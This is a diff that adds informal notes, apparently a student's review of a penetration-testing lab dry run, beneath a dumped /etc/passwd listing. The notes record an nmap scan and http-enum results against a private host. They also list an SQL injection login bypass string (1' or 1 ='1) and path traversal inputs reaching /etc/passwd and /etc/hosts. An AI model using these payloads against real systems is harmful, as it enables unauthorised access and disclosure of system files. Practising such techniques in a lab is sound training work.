@@ -660,8 +660,25 @@ pollinate:x:110:1::/var/cache/pollinate:/bin/false
 ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash 
 mysql:x:111:115:MySQL Server,,,:/nonexistent:/bin/false 
 user2:x:1001:1001::/home/user2:/bin/sh 
-
-
+### reviwe of dry run
+nmap 10.50.27.14
+22 ssh
+80 http
+---
+namp 10.50.27.14 --script=http-enum.nse
+/login.php
+/loging.html
+/img/
+---
+fire fox
+	10.50.27.14
+ 		Login page
+   			usr 1' or 1 ='1
+      			pass 1' or 1 ='1
+	 		http post and and ? and the raw string all passwords
+    		info page
+      			../../../etc/passwd
+	 		../../../etc/hosts
 
 
 
